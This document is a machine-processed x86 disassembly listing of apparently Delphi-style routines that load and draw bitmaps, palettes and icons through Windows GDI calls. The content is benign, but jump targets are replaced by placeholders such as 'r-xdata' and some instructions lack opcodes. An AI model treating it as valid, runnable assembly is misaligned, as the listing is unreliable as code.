xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4208b4
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c40
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41d494
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41571c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4156ac
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41d718
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41d738
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_4156ac
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41d5a8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41d9e0
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4156ac
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41d5a8
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41dc98
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c69c
call sub_41d494
jmp r-xdata
xor eax eax
push ebp
push sub_4207fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4156ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420772
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420836
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c69c
call sub_41d494
jmp r-xdata
sub_420772
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_420836
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4208cb
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41dc98
mov [ ebp - 0x30 ] eax
sub_4208e8
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42029c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42092c
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42002c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_4156ac
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42029c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4203c4
call sub_41d494
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42099c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_42002c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_41f644
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_420a37
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42029c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420a60
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_41fee8
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_42002c
mov eax esi
call sub_42013c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_42002c
mov eax esi
call sub_42013c
mov eax esi
call sub_41ffb8
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_41f644
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_41fa48
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42029c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42029c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_41efe0
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420b98
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42003c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_41fa48
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420bec
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_42003c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_41fa48
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420c6c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42002c
mov eax ebx
call sub_42003c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_41efe0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420d03
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42029c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41eed8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41b4a8
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_420d08
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4039d0
call sub_403a24
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41eed8
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420d40
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42003c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_41fa48
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420d9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_41ffb8
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41e3d4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4156e4
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4156e4
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_41fe7c
mov dl [ r-xdata ]
call sub_41d290
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41d5a8
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_41ef94
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4156e4
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_4156e4
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4156e4
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_4156e4
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_4156e4
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_4156e4
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41da18
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_4156e4
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41dd3c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42105c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_42003c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_41efe0
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4210d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_41f644
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4210fc
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_421144
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41e710
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41ee0c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_421198
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_41ee10
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413db8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4211c8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_4214a0
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_41ee0c
mov eax [ esi + 0x28 ]
call sub_41ee10
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413de4
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_421228
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41d290
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_421280
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_4212bc
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_4154a0
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_4156ac
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41dfe8
jmp r-xdata
jmp r-xdata
call sub_41d4a0
sub_421334
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4213c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_421280
cmp eax [ rw-data ]
jne r-xdata
call sub_41d4a0
mov eax esi
call sub_421280
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41e514
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c40
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4156e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4213e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421476
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415480
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_4156ac
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4156ac
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4214a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41d4a0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42147b
mov eax [ ebp - 0x4 ]
call sub_403234
call sub_4039d0
call sub_403a24
mov edx ebx
mov eax ebx
mov ecx [ eax ]
